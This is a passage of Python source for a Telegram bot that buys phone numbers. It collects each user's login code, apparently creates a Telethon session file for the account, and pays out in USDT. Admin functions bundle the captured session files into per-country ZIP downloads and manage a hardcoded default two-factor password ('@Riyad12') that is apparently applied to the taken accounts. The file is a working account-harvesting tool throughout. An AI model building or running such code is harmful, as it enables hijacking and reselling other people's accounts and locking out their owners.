        cursor.execute("SELECT balance, verified_count, total_earned FROM users WHERE user_id = ?", (message.from_user.id,))
        return cursor.fetchone()
    
    result = thread_safe_db_operation(operation)
    if result:
        balance, verified, earned = result
        text = f"""💼 **Your Account**

💰 Balance: ${balance:.2f}
✅ Verified Numbers: {verified}
💸 Total Earned: ${earned:.2f}

💳 Minimum withdrawal: ${MIN_WITHDRAW}"""
        
        if balance >= MIN_WITHDRAW:
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("💳 Withdraw", callback_data="user_withdraw"))
            bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode="Markdown")
        else:
            bot.send_message(message.chat.id, text, parse_mode="Markdown")
    else:
        bot.send_message(message.chat.id, "❌ Account not found. Use /start first.")

@bot.message_handler(commands=["withdraw"])
@channel_join_required
def command_withdraw(message):
    def operation(cursor):
        cursor.execute("SELECT balance FROM users WHERE user_id = ?", (message.from_user.id,))
        result = cursor.fetchone()
        return result[0] if result else 0
    
    balance = thread_safe_db_operation(operation)
    
    if balance < MIN_WITHDRAW:
        bot.send_message(message.chat.id, f"❌ Minimum withdrawal is ${MIN_WITHDRAW}. Your balance: ${balance:.2f}")
        return
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("💳 LD Card", callback_data="withdraw_ld"))
    markup.add(types.InlineKeyboardButton("🟢 USDT (BEP20)", callback_data="withdraw_usdt"))
    
    withdraw_text = get_text(message.from_user.id, "withdraw_methods")
    bot.send_message(message.chat.id, withdraw_text, reply_markup=markup, parse_mode="Markdown")

# Callback handlers
@bot.callback_query_handler(func=lambda call: call.data.startswith("withdraw_"))
def withdraw_handler(call):
    user_id = call.from_user.id
    
    def operation(cursor):
        cursor.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
        result = cursor.fetchone()
        return result[0] if result else 0
    
    balance = thread_safe_db_operation(operation)
    
    if call.data == "withdraw_ld":
        set_user_data(user_id, {"state": "withdraw_ld", "amount": balance})
        bot.send_message(user_id, "💳 Please send your LD Card information:")
    elif call.data == "withdraw_usdt":
        set_user_data(user_id, {"state": "withdraw_usdt", "amount": balance})
        bot.send_message(user_id, "🟢 Please send your USDT (BEP20) address:")
    
    bot.answer_callback_query(call.id)

# Text message handler
@bot.message_handler(func=lambda m: not m.text.startswith("/"))
@channel_join_required
def text_message_handler(message):
    performance_monitor.thread_started()
    try:
        chat_id = message.chat.id
        text = message.text.strip()
        user_state = get_user_data(chat_id)
        
        # Admin commands
        if is_admin(chat_id) and user_state:
            state = user_state.get("state")
            if state == "awaiting_broadcast":
                admin_process_broadcast(message)
                return
            elif state == "awaiting_rate":
                admin_process_set_rate(message)
                return
            elif state == "awaiting_capacity":
                admin_process_set_capacity(message)
                return
            elif state == "awaiting_toggle":
                admin_process_toggle_status(message)
                return
            elif state == "awaiting_addbalance_info":
                admin_process_balance_change(message, "add")
                return
            elif state == "awaiting_removebalance_info":
                admin_process_balance_change(message, "remove")
                return
            elif state == "awaiting_addadmin_id":
                admin_process_admin_change(message, "add")
                return
            elif state == "awaiting_removeadmin_id":
                admin_process_admin_change(message, "remove")
                return
            elif state == "awaiting_new_2fa_password":
                admin_process_change_2fa_password(message)
                return
        
        # User states
        if user_state:
            state = user_state.get("state")
            
            if state in ["withdraw_ld", "withdraw_usdt"]:
                process_withdrawal(message)
                return
            elif state == "awaiting_code" and re.match(r"^\d{5}$", text):
                process_verification_code(message, text)
                return
        
        # Phone number processing
        if re.match(r"^\+\d{7,15}$", text):
            process_phone_number(message)
            return
        
        # Verification code
        if re.match(r"^\d{5}$", text):
            process_verification_code(message, text)
            return
        
        # Default
        send_welcome(message)
        
    finally:
        performance_monitor.thread_completed()

def process_phone_number(message):
    chat_id = message.chat.id
    phone = message.text.strip()
    
    # Check if number used
    def check_number(cursor):
        cursor.execute("SELECT 1 FROM used_numbers WHERE phone_number = ?", (phone,))
        return cursor.fetchone()
    
    if thread_safe_db_operation(check_number):
        bot.send_message(chat_id, "❌ This number has already been used.")
        return
    
    # Check country availability
    country_info = get_country_info(phone)
    if not country_info["code"]:
        bot.send_message(chat_id, "❌ Could not verify country.")
        return
    
    def check_country(cursor):
        cursor.execute("SELECT capacity, usage_count FROM country_rates WHERE country_code = ? AND status = 'on'", (country_info["code"],))
        return cursor.fetchone()
    
    rate_info = thread_safe_db_operation(check_country)
    if not rate_info:
        bot.send_message(chat_id, f"❌ Numbers from {country_info['code']} not accepted.")
        return
    
    capacity, usage = rate_info
    if usage >= capacity:
        bot.send_message(chat_id, f"❌ Capacity for {country_info['code']} is full.")
        return
    
    # Start login process
    processing_msg = bot.send_message(chat_id, get_text(chat_id, "processing"))
    
    def login_task():
        performance_monitor.thread_started()
        try:
            run_telethon_task(send_login_code, chat_id, phone, processing_msg.message_id)
        finally:
            performance_monitor.thread_completed()
    
    threading.Thread(target=login_task, daemon=True).start()

def process_verification_code(message, code):
    chat_id = message.chat.id
    user_state = get_user_data(chat_id)
    
    if not user_state or user_state.get("state") != "awaiting_code":
        return
    
    phone = user_state["phone"]
    processing_text = get_text(chat_id, "processing")
    
    if "code_msg_id" in user_state:
        try:
            bot.edit_message_text(processing_text, chat_id, user_state["code_msg_id"])
            msg_id = user_state["code_msg_id"]
        except:
            processing_msg = bot.send_message(chat_id, processing_text)
            msg_id = processing_msg.message_id
    else:
        processing_msg = bot.send_message(chat_id, processing_text)
        msg_id = processing_msg.message_id
    
    def verify_task():
        performance_monitor.thread_started()
        try:
            run_telethon_task(_generate_session_file, chat_id, phone, code, 
                            user_state["phone_code_hash"], user_state["session_filename"], msg_id)
        finally:
            performance_monitor.thread_completed()
    
    threading.Thread(target=verify_task, daemon=True).start()

def process_withdrawal(message):
    chat_id = message.chat.id
    user_state = get_user_data(chat_id)
    
    if not user_state:
        bot.send_message(chat_id, "❌ Session expired. Please restart.")
        return
    
    amount = user_state.get("amount")
    address = message.text.strip()
    method = "LD Card" if user_state.get("state") == "withdraw_ld" else "USDT (BEP20)"
    
    if not amount:
        bot.send_message(chat_id, "❌ Invalid amount.")
        delete_user_data(chat_id)
        return
    
    # Validate USDT address
    if method == "USDT (BEP20)" and not re.match(r"^0x[a-fA-F0-9]{40}$", address):
        bot.send_message(chat_id, "❌ Invalid USDT address format.")
        return
    
    # Process withdrawal
    trans_no = f"TX{random.randint(100000, 999999)}"
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    
    def operation(cursor):
        cursor.execute("""
            INSERT INTO withdraw_history 
            (user_id, amount, address, timestamp, trans_no, currency, status)
            VALUES (?, ?, ?, ?, ?, ?, 'pending')
        """, (chat_id, amount, address, timestamp, trans_no, method))
        
        cursor.execute("UPDATE users SET balance = balance - ? WHERE user_id = ?", (amount, chat_id))
    
    thread_safe_db_operation(operation)
    
    # Notify user
    bot.send_message(chat_id, f"✅ Withdrawal submitted!\nTransaction: {trans_no}\nAmount: ${amount:.2f}")
    
    # Notify admin
    admin_msg = f"""💸 **New Withdrawal Request**

👤 User: {message.from_user.first_name}
💰 Amount: ${amount:.2f}
💳 Method: {method}
📋 Transaction: {trans_no}
⏰ Time: {timestamp}"""
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✅ Approve", callback_data=f"approve_{trans_no}"))
    
    bot.send_message(WITHDRAW_GROUP_ID, admin_msg, reply_markup=markup, parse_mode="Markdown")
    
    delete_user_data(chat_id)

@bot.callback_query_handler(func=lambda call: call.data.startswith("approve_"))
def approve_withdrawal(call):
    if not is_admin(call.from_user.id):
        bot.answer_callback_query(call.id, "❌ Admin access required.")
        return
    
    trans_no = call.data.replace("approve_", "")
    
    def operation(cursor):
        cursor.execute("UPDATE withdraw_history SET status = 'completed' WHERE trans_no = ?", (trans_no,))
        cursor.execute("SELECT user_id, amount FROM withdraw_history WHERE trans_no = ?", (trans_no,))
        return cursor.fetchone()
    
    result = thread_safe_db_operation(operation)
    if result:
        user_id, amount = result
        bot.send_message(user_id, f"✅ Withdrawal approved!\nTransaction: {trans_no}\nAmount: ${amount:.2f}")
        bot.answer_callback_query(call.id, "✅ Withdrawal approved!")
        bot.edit_message_text(f"✅ Approved {trans_no}", call.message.chat.id, call.message.message_id)
    else:
        bot.answer_callback_query(call.id, "❌ Withdrawal not found.")

# Admin panel
@bot.message_handler(commands=["admin"])
def admin_panel(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Admin access required.")
        return
    
    def operation(cursor):
        cursor.execute("SELECT COUNT(*) FROM users")
        total_users = cursor.fetchone()[0]
        cursor.execute("SELECT SUM(balance) FROM users")
        total_balance = cursor.fetchone()[0] or 0
        cursor.execute("SELECT COUNT(*) FROM withdraw_history WHERE status = 'pending'")
        pending_withdrawals = cursor.fetchone()[0]
        
        cursor.execute("SELECT value FROM settings WHERE key = '2fa_password'")
        twofa_password_tuple = cursor.fetchone()
        current_password = twofa_password_tuple[0] if twofa_password_tuple else "@Riyad12"
        
        return total_users, total_balance, pending_withdrawals, current_password
    
    result = thread_safe_db_operation(operation)
    if result:
        total_users, total_balance, pending, current_password = result
    else:
        total_users, total_balance, pending, current_password = 0, 0, 0, "@Riyad12"
    
    stats = performance_monitor.get_stats()
    
    admin_text = f"""👑 **Admin Panel**

📊 Statistics:
• Total Users: {total_users}
• Total Balance: ${total_balance:.2f}
• Pending Withdrawals: {pending}

⚡ Performance:
• Uptime: {stats['uptime_hours']:.1f}h
• Requests: {stats['requests_processed']}
• Active Threads: {stats['current_threads']}

🔐 Current 2FA Password: {current_password}"""
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("👥 Users", callback_data="admin_users"))
    markup.add(types.InlineKeyboardButton("💳 Withdrawals", callback_data="admin_withdrawals"))
    markup.add(types.InlineKeyboardButton("🌍 Rates", callback_data="admin_rates"))
    markup.add(types.InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast"))
    markup.add(types.InlineKeyboardButton("📊 Manage Rates", callback_data="admin_rates_menu"))
    markup.add(types.InlineKeyboardButton("💰 Balance Management", callback_data="admin_balance_menu"))
    markup.add(types.InlineKeyboardButton("👑 Admin Management", callback_data="admin_admins_menu"))
    markup.add(types.InlineKeyboardButton("📁 Download Sessions ZIP", callback_data="admin_sessions_zip"))
    markup.add(types.InlineKeyboardButton("🗑️ Clear Session Files", callback_data="admin_clear_sessions"))
    markup.add(types.InlineKeyboardButton("🚦 Toggle 2FA", callback_data="admin_toggle_2fa"))
    markup.add(types.InlineKeyboardButton("🔐 Change 2FA Password", callback_data="admin_change_2fa_password"))
    
    bot.send_message(message.chat.id, admin_text, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("admin_"))
def admin_callback_handler(call):
    if not is_admin(call.from_user.id):
        bot.answer_callback_query(call.id, "❌ Admin access required.")
        return
    
    action = call.data.replace("admin_", "")
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    try:
        bot.delete_message(chat_id, message_id)
    except:
        pass
    
    if action == "users":
        def operation(cursor):
            cursor.execute("SELECT user_id, full_name, balance, verified_count FROM users ORDER BY balance DESC LIMIT 20")
            return cursor.fetchall()
        
        users = thread_safe_db_operation(operation) or []
        
        text = "👥 **Top 20 Users**\n\n"
        for user_id, name, balance, verified in users:
            text += f"• {name}: ${balance:.2f} | {verified} verified\n"
        
        bot.send_message(chat_id, text, parse_mode="Markdown")
        
    elif action == "withdrawals":
        def operation(cursor):
            cursor.execute("""
                SELECT wh.trans_no, u.full_name, wh.amount, wh.currency, wh.timestamp 
                FROM withdraw_history wh 
                JOIN users u ON wh.user_id = u.user_id 
                WHERE wh.status = 'pending' 
                ORDER BY wh.timestamp DESC
            """)
            return cursor.fetchall()
        
        withdrawals = thread_safe_db_operation(operation) or []
        
        if not withdrawals:
            text = "✅ No pending withdrawals."
        else:
            text = "📋 **Pending Withdrawals**\n\n"
            for trans_no, name, amount, currency, timestamp in withdrawals:
                text += f"• {trans_no}: {name} - ${amount:.2f} ({currency})\n"
        
        bot.send_message(chat_id, text, parse_mode="Markdown")
        
    elif action == "rates":
        def operation(cursor):
            cursor.execute("SELECT country_code, rate, status, capacity, usage_count FROM country_rates")
            return cursor.fetchall()
        
        countries = thread_safe_db_operation(operation) or []
        
        text = "🌍 **Country Rates**\n\n"
        for code, rate, status, capacity, usage in countries:
            text += f"• {code}: ${rate} | {status} | {usage}/{capacity}\n"
        
        bot.send_message(chat_id, text, parse_mode="Markdown")
        
    elif action == "broadcast":
        set_user_data(chat_id, {"state": "awaiting_broadcast"})
        bot.send_message(chat_id, "📢 Send broadcast message:")
        
    elif action == "rates_menu":
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton("✏️ Set Rate/Time", callback_data="admin_set_rate"))
        markup.add(types.InlineKeyboardButton("📦 Set Capacity", callback_data="admin_set_capacity"))
        markup.add(types.InlineKeyboardButton("🚦 Toggle Status (On/Off)", callback_data="admin_toggle_status"))
        markup.add(types.InlineKeyboardButton("⬅️ Back", callback_data="admin_main_panel"))
        bot.send_message(chat_id, "📊 **Manage Rates**", reply_markup=markup, parse_mode="Markdown")

    elif action == "set_rate":
        def operation(cursor):
            cursor.execute("SELECT country_code FROM country_rates ORDER BY country_code")
            countries = cursor.fetchall()
            country_list = "\n".join([f"- {pycountry.countries.get(alpha_2=c[0]).name}" for c in countries if pycountry.countries.get(alpha_2=c[0])])
            return country_list
        
        country_list = thread_safe_db_operation(operation)
        bot.send_message(chat_id, f"**Current Countries in DB:**\n{country_list}\n\nSend info:\n`CountryName Rate Time`", parse_mode="Markdown")
        set_user_data(chat_id, {"state": "awaiting_rate"})

    elif action == "set_capacity":
        def operation(cursor):
            cursor.execute("SELECT country_code, usage_count, capacity FROM country_rates ORDER BY country_code")
            capacities = cursor.fetchall()
            capacity_list = "\n".join([f"- {pycountry.countries.get(alpha_2=c[0]).name}: {c[1]}/{c[2]}" for c in capacities if pycountry.countries.get(alpha_2=c[0])])
            return capacity_list
        
        capacity_list = thread_safe_db_operation(operation)
        bot.send_message(chat_id, f"**Current Capacities:**\n{capacity_list}\n\nSend info:\n`CountryName Capacity`", parse_mode="Markdown")
        set_user_data(chat_id, {"state": "awaiting_capacity"})

    elif action == "toggle_status":
        def operation(cursor):
            cursor.execute("SELECT country_code, status FROM country_rates ORDER BY country_code")
            statuses = cursor.fetchall()
            status_list = "\n".join([f"- {pycountry.countries.get(alpha_2=c[0]).name}: {'✅ On' if c[1] == 'on' else '❌ Off'}" for c in statuses if pycountry.countries.get(alpha_2=c[0])])
            return status_list
        
        status_list = thread_safe_db_operation(operation)
        bot.send_message(chat_id, f"**Current Statuses:**\n{status_list}\n\nSend the country name to toggle status.", parse_mode="Markdown")
        set_user_data(chat_id, {"state": "awaiting_toggle"})

    elif action == "balance_menu":
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(types.InlineKeyboardButton("➕ Add Balance", callback_data="admin_add_balance"),
                   types.InlineKeyboardButton("➖ Remove Balance", callback_data="admin_remove_balance"))
        markup.add(types.InlineKeyboardButton("⬅️ Back", callback_data="admin_main_panel"))
        bot.send_message(chat_id, "💰 **Balance Management**", reply_markup=markup, parse_mode="Markdown")

    elif action == "add_balance":
        bot.send_message(chat_id, "Send: `UserID Amount`"); set_user_data(chat_id, {"state": "awaiting_addbalance_info"})
    elif action == "remove_balance":
        bot.send_message(chat_id, "Send: `UserID Amount`"); set_user_data(chat_id, {"state": "awaiting_removebalance_info"})

    elif action == "admins_menu":
        if not is_super_admin(call.from_user.id): bot.answer_callback_query(call.id, "❌ Super Admin Only.", show_alert=True); return
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(types.InlineKeyboardButton("➕ Add Admin", callback_data="admin_add_admin"),
                   types.InlineKeyboardButton("➖ Remove Admin", callback_data="admin_remove_admin"))
        markup.add(types.InlineKeyboardButton("📋 List Admins", callback_data="admin_list_admins"))
        markup.add(types.InlineKeyboardButton("⬅️ Back", callback_data="admin_main_panel"))
        bot.send_message(chat_id, "👑 **Admin Management**", reply_markup=markup, parse_mode="Markdown")

    elif action == "add_admin":
        bot.send_message(chat_id, "Send the User ID of the new admin."); set_user_data(chat_id, {"state": "awaiting_addadmin_id"})
    elif action == "remove_admin":
        bot.send_message(chat_id, "Send the User ID of the admin to remove."); set_user_data(chat_id, {"state": "awaiting_removeadmin_id"})
    elif action == "list_admins":
        list_admins(call.message)

    elif action == "sessions_zip":
        create_and_send_session_zips(chat_id)

    elif action == "clear_sessions":
        show_clear_confirmation(call.message)

    elif action == "confirm_clear_sessions":
        clear_session_files(chat_id)

    elif action == "cancel_clear_sessions":
        bot.send_message(chat_id, "❌ Session file deletion cancelled.")

    elif action == "toggle_2fa":
        def operation(cursor):
            cursor.execute("SELECT value FROM settings WHERE key = '2fa_status'")
            twofa_status_tuple = cursor.fetchone()
            twofa_status = twofa_status_tuple[0] if twofa_status_tuple else "on"
            new_status = "off" if twofa_status == "on" else "on"
            cursor.execute("REPLACE INTO settings (key, value) VALUES ('2fa_status', ?)", (new_status,))
            return new_status
        
        new_status = thread_safe_db_operation(operation)
        bot.send_message(chat_id, f"✅ 2FA status toggled to {new_status.upper()}.")

    elif action == "change_2fa_password":
        bot.send_message(chat_id, "Send the new 2FA password.")
        set_user_data(chat_id, {"state": "awaiting_new_2fa_password"})

    elif action == "main_panel":
        admin_panel(call.message)
    
    bot.answer_callback_query(call.id)

# Admin processing functions
def admin_process_broadcast(message):
    chat_id = message.chat.id
    bot.send_message(chat_id, "⏳ Broadcast starting...")
    
    def operation(cursor):
        cursor.execute("SELECT user_id FROM users")
        users = cursor.fetchall()
        return users
    
    users = thread_safe_db_operation(operation)
    success, fail = 0, 0
    for user in users:
        try:
            bot.copy_message(user[0], message.chat.id, message.message_id); success += 1
        except: fail += 1
        time.sleep(0.05)
    report = f"📣 Broadcast Report\n✅ Sent: {success}\n❌ Failed: {fail}"
    bot.send_message(chat_id, report)
    delete_user_data(chat_id)

def admin_process_set_rate(message):
    try:
        parts = message.text.split()
        if len(parts) < 3: bot.reply_to(message, "❌ Invalid format: CountryName Rate Time"); return
        rate = float(parts[-2]); claim_time = int(parts[-1]); country_name = " ".join(parts[:-2])
        country_code = get_country_code_from_name(country_name)
        if not country_code: bot.reply_to(message, f"❌ Country not found: {country_name}"); return
        
        def operation(cursor):
            cursor.execute("REPLACE INTO country_rates (country_code, rate, claim_time_seconds, status, capacity, usage_count) VALUES (?, ?, ?, 'on', 10, 0)", (country_code, rate, claim_time))
        
        thread_safe_db_operation(operation)
        bot.reply_to(message, f"✅ Rate for {country_name} set to ${rate} and time to {claim_time}s.")
    except Exception as e: bot.reply_to(message, f"❌ Error: {e}")
    finally:
        delete_user_data(message.chat.id)

def admin_process_set_capacity(message):
    try:
        parts = message.text.split()
        if len(parts) < 2: bot.reply_to(message, "❌ Invalid format: CountryName Capacity"); return
        capacity = int(parts[-1]); country_name = " ".join(parts[:-1])
        country_code = get_country_code_from_name(country_name)
        if not country_code: bot.reply_to(message, f"❌ Country not found: {country_name}"); return
        
        def operation(cursor):
            cursor.execute("UPDATE country_rates SET capacity = ? WHERE country_code = ?", (capacity, country_code))
        
        thread_safe_db_operation(operation)
        bot.reply_to(message, f"✅ Capacity for {country_name} set to {capacity}.")
    except Exception as e: bot.reply_to(message, f"❌ Error: {e}")
    finally:
        delete_user_data(message.chat.id)

def admin_process_toggle_status(message):
    try:
        country_name = message.text.strip(); country_code = get_country_code_from_name(country_name)
        if not country_code: bot.reply_to(message, f"❌ Country not found: {country_name}"); return
        
        def operation(cursor):
            current_status_tuple = cursor.execute("SELECT status FROM country_rates WHERE country_code = ?", (country_code,)).fetchone()
            if not current_status_tuple: return None
            current_status = current_status_tuple[0]
            new_status = "off" if current_status == "on" else "on"
            cursor.execute("UPDATE country_rates SET status = ? WHERE country_code = ?", (new_status, country_code))
            return new_status
        
        new_status = thread_safe_db_operation(operation)
        if new_status:
            bot.reply_to(message, f"✅ Status for {country_name} toggled to {new_status.upper()}.")
        else:
            bot.reply_to(message, f"❌ {country_name} not in database.")
    except Exception as e: bot.reply_to(message, f"❌ Error: {e}")
    finally:
        delete_user_data(message.chat.id)

def admin_process_balance_change(message, action):
    parts = message.text.split()
    if len(parts) != 2: bot.reply_to(message, "Usage: <user_id> <amount>"); return
    try:
        target_user_id = int(parts[0]); amount = float(parts[1])
    except ValueError: bot.reply_to(message, "❌ Invalid User ID or Amount."); return
    
    def operation(cursor):
        if not cursor.execute("SELECT 1 FROM users WHERE user_id = ?", (target_user_id,)).fetchone():
            return None
        if action == "add": 
            cursor.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, target_user_id)); action_text = "added to"
        else: 
            cursor.execute("UPDATE users SET balance = balance - ? WHERE user_id = ?", (amount, target_user_id)); action_text = "removed from"
        new_balance = cursor.execute("SELECT balance FROM users WHERE user_id = ?", (target_user_id,)).fetchone()[0]
        return action_text, new_balance
    
    result = thread_safe_db_operation(operation)
    if result:
        action_text, new_balance = result
        bot.reply_to(message, f"✅ Success! ${amount:.2f} has been {action_text} User ID {target_user_id}.\nNew Balance: ${new_balance:.2f}")
        try:
            user_notification = f"ℹ️ Admin Notification\n\nAn admin has adjusted your balance.\nAmount: ${amount:.2f} ({action_text} your account)\nYour new balance is: ${new_balance:.2f}"
            bot.send_message(target_user_id, user_notification, parse_mode="Markdown")
        except Exception as e: logging.error(f"Could not notify user {target_user_id}: {e}")
    else:
        bot.reply_to(message, f"❌ User with ID {target_user_id} not found.")
    delete_user_data(message.chat.id)

def admin_process_admin_change(message, action):
    if not is_super_admin(message.from_user.id): bot.reply_to(message, "❌ Super Admin Only."); return
    try:
        target_user_id = int(message.text.strip())
    except ValueError: bot.reply_to(message, "❌ Invalid User ID."); return
    
    def operation(cursor):
        if action == "add":
            cursor.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (target_user_id,)); action_text = "added as an admin"
        else:
            if target_user_id == ADMIN_ID: return None
            cursor.execute("DELETE FROM admins WHERE user_id = ?", (target_user_id,)); action_text = "removed from admins"
        return action_text
    
    result = thread_safe_db_operation(operation)
    if result:
        bot.reply_to(message, f"✅ Success! User {target_user_id} has been {result}.")
    else:
        bot.reply_to(message, "❌ You cannot remove the Main Admin.")
    delete_user_data(message.chat.id)

def admin_process_change_2fa_password(message):
    new_password = message.text.strip()
    if not new_password:
        bot.reply_to(message, "❌ Invalid password. Please provide a valid password.")
        return
    
    def operation(cursor):
        cursor.execute("REPLACE INTO settings (key, value) VALUES ('2fa_password', ?)", (new_password,))
    
    thread_safe_db_operation(operation)
    bot.reply_to(message, f"✅ 2FA password changed to `{new_password}`.", parse_mode="Markdown")
    delete_user_data(message.chat.id)

def list_admins(message):
    def operation(cursor):
        cursor.execute("SELECT user_id FROM admins")
        admins = cursor.fetchall()
        return admins
    
    admins = thread_safe_db_operation(operation)
    admin_list_text = "📋 Current Admins:\n\n"
    for admin_id in admins:
        admin_list_text += f"- {admin_id[0]}{' (Main Admin)' if admin_id[0] == ADMIN_ID else ''}\n"
    bot.send_message(message.chat.id, admin_list_text, parse_mode="Markdown")

def get_country_code_from_name(country_name):
    try:
        country = pycountry.countries.search_fuzzy(country_name)
        return country[0].alpha_2
    except:
        return None

def create_and_send_session_zips(chat_id):
    country_sessions = {}
    logging.info(f"Checking session files in {SESSIONS_FOLDER}")
    if not os.path.exists(SESSIONS_FOLDER):
        logging.error("Sessions folder does not exist!")
        bot.send_message(chat_id, "❌ Error: Sessions folder not found. Please ensure session files are saved.")
        return

    def operation(cursor):
        cursor.execute("SELECT phone_number FROM used_numbers")
        claimed_phones = [row[0] for row in cursor.fetchall()]
        return claimed_phones
    
    claimed_phones = thread_safe_db_operation(operation)

    for filename in os.listdir(SESSIONS_FOLDER):
        if filename.endswith(".session"):
            phone_number = filename.replace(".session", "")
            if phone_number in claimed_phones:
                session_path = os.path.join(SESSIONS_FOLDER, filename)
                logging.info(f"Processing claimed session file: {filename}")
                country_info = get_country_info(phone_number)
                if country_info["code"]:
                    country_code = country_info["code"]
                    country_sessions[country_code] = country_sessions.get(country_code, 0) + 1
                else:
                    logging.warning(f"Could not determine country code for phone number: {phone_number}")

    if not country_sessions:
        bot.send_message(chat_id, "𝐂𝐡𝐞𝐜𝐤 𝐒𝐞𝐬𝐬𝐢𝐨𝐧 🎛Statistic:\n\n❌ No claimed sessions found.")
        return

    stat_message = "𝐂𝐡𝐞𝐜𝐤 𝐒𝐞𝐬𝐬𝐢𝐨𝐧 🎛Statistic:\n\n"
    for country_code, count in country_sessions.items():
        flag = "".join(chr(ord(c) + 127397) for c in country_code.upper())
        try:
            country_name = pycountry.countries.get(alpha_2=country_code).name
            dial_code = country_code_for_region(country_code)
            stat_message += f"{flag} {country_name} (+{dial_code}) => {count}\n"
        except Exception as e:
            logging.error(f"Error formatting country {country_code}: {e}")
            stat_message += f"{flag} +{country_code} => {count}\n"
    bot.send_message(chat_id, stat_message, parse_mode="Markdown")

    for country_code, count in country_sessions.items():
        zip_filename = f"+{country_code} all session file - {count}.zip"
        logging.info(f"Creating ZIP file: {zip_filename}")
        with zipfile.ZipFile(zip_filename, "w") as zipf:
            for filename in os.listdir(SESSIONS_FOLDER):
                if filename.endswith(".session"):
                    phone_number = filename.replace(".session", "")
                    if phone_number in claimed_phones:
                        session_path = os.path.join(SESSIONS_FOLDER, filename)
                        country_info = get_country_info(phone_number)
                        if country_info["code"] == country_code:
                            zipf.write(session_path, arcname=filename)
        if os.path.getsize(zip_filename) > 0:
            with open(zip_filename, "rb") as zip_file:
                bot.send_document(chat_id, zip_file, caption=f"{count} claimed session file(s) for +{country_code}")
            os.remove(zip_filename)
        else:
            logging.warning(f"ZIP file {zip_filename} is empty, not sending.")
            os.remove(zip_filename)

def show_clear_confirmation(message):
    markup = types.InlineKeyboardMarkup()
    yes_button = types.InlineKeyboardButton("Yes", callback_data="admin_confirm_clear_sessions")
    no_button = types.InlineKeyboardButton("No", callback_data="admin_cancel_clear_sessions")
    markup.add(yes_button, no_button)
    bot.send_message(message.chat.id, "Are you sure you want to delete all session files?", reply_markup=markup)

def clear_session_files(chat_id):
    for filename in os.listdir(SESSIONS_FOLDER):
        file_path = os.path.join(SESSIONS_FOLDER, filename)
        if os.path.isfile(file_path):
            os.remove(file_path)
    bot.send_message(chat_id, "✅ All session files have been deleted.")

# Start bot
def initialize_bot():
    logging.info("🚀 Initializing bot...")
    
    try:
        bot.get_me()
        logging.info("✅ Bot connected")
        
        test_db = thread_safe_db_operation(lambda cursor: cursor.execute("SELECT 1").fetchone())
        if test_db:
            logging.info("✅ Database connected")
        
        logging.info("🎉 Bot ready")
        return True
    except Exception as e:
        logging.error(f"❌ Initialization failed: {e}")
        return False

if __name__ == "__main__":
    if initialize_bot():
        # Start performance monitor
        def monitor():
            while True:
                time.sleep(300)
                stats = performance_monitor.get_stats()
                logging.info(f"Performance: {stats}")
        
        threading.Thread(target=monitor, daemon=True).start()
        
        # Start bot
        while True:
            try:
                bot.infinity_polling(timeout=25, long_polling_timeout=20)
            except Exception as e:
                logging.error(f"Bot error: {e}. Restarting in 10s...")
                time.sleep(10)
    else:
        logging.error("❌ Bot failed to start")
